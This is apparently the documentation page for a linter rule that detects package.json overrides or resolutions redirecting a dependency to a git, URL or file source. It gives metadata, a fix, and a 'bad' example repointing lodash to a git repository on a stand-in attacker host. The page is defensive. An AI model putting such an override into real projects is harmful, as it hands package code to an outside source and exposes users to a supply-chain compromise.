# VIBE-DEP-003: Overrides/resolutions repoint a package to a non-registry source

An overrides/resolutions entry redirects a package to git/URL/file.

## Metadata

| Field | Value |
| --- | --- |
| Severity | MEDIUM |
| Confidence | 0.50 |
| Maturity | stable |
| Mode | comment |
| Languages | json |
| File kinds | config |
| CWE | CWE-494 |
| OWASP | A08 |

## Description

An overrides/resolutions entry repoints a package to a non-registry (git/URL/file) source,
a supply-chain redirection that can replace a trusted package with arbitrary code deep in
the dependency tree.

## Fix

Remove the override or point it at a published registry version; if a git/URL source is required, vendor-review it and pin it to an immutable commit SHA.

## Examples

Bad:

```bad
"overrides": { "lodash": "git+https://evil.example/lodash.git" }
```

Good:

```good
"overrides": { "lodash": "4.17.21" }
```

